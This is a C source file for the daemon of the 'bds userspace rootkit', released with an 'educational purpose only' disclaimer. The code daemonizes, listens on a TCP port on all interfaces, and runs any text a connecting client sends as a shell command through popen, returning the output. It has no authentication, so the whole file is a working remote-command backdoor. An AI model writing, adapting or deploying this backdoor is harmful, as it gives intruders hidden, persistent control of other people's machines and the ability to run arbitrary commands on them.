/*
bds daemon for bds userspace rootkit

developed by : Antonius (Antonius Robotsoft)

website : www.bluedragonsec.com

github : https://github.com/bluedragonsecurity

twitter : https://twitter.com/bluedragonsec


Warning!! This rootkit is for educational purpouse only! I am not       
responsible to anything you do with this !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/file.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include "bds_userspace_functions.h"
#include "bds_vars.h"

#ifndef SOL_SOCKET 
#define SOL_SOCKET      1
#endif

#ifndef  SO_REUSEADDR 
#define SO_REUSEADDR    2
#endif

int main() {
	int sock, result, sin_size = 0;  
        struct sockaddr_in server_addr;   
	struct sockaddr_in client_addr;    	
	static const uint8_t BACKLOG = 4;
	int res = 0;
	char *ask_cmd = "CMD :";
	char buf[255];
	char *client_ip = NULL;
	FILE *fp = NULL; 
	 char cmd_result[256];
	
        daemonize(daemon_pid);
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
            fprintf(stdout,"Socket error  ! exit ! \n");
            return 1;
        }
	server_addr.sin_family = AF_INET;         
        server_addr.sin_port = htons(daemon_port);     
        server_addr.sin_addr.s_addr = INADDR_ANY; 
        bzero(&(server_addr.sin_zero), 8); 
        if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0) {
            printf("setsockopt(SO_REUSEADDR) failed");
        }
        if (setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &(int){1}, sizeof(int)) < 0) {
            printf("setsockopt(SO_REUSEPORT) failed");
        }
        if ((sock = fcntl_nonblock(sock)) < 0) {
            printf("failed to set non blocking sock");
        }
        if (bind(sock, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
            printf("Error code: %d\n", errno);
            fprintf(stdout,"Bind failed ! exit ! \n");
            exit(-1);
        }
        if (listen(sock, BACKLOG) == -1) {
            fprintf(stdout,"Listen failed ! exit ! \n");
            exit(-1);
        }
        
        while(1) { 
		if ((result  = accept(sock, (struct sockaddr *)&client_addr,(socklen_t * __restrict__)(&sin_size))) >= 0) {
			begin:
			write(result, ask_cmd, strlen(ask_cmd));
			res = read(result, buf, sizeof(buf));
			if (res > 0) {
				fp = popen(buf, "r");
				if (fp != NULL) {
					while (fgets(cmd_result, sizeof(cmd_result), fp) != NULL) {
						write(result, cmd_result, strlen(cmd_result));
					}
					pclose(fp);
				}
				goto begin;
			}
		}
	}
	printf("\n");
	
	return 0;
}
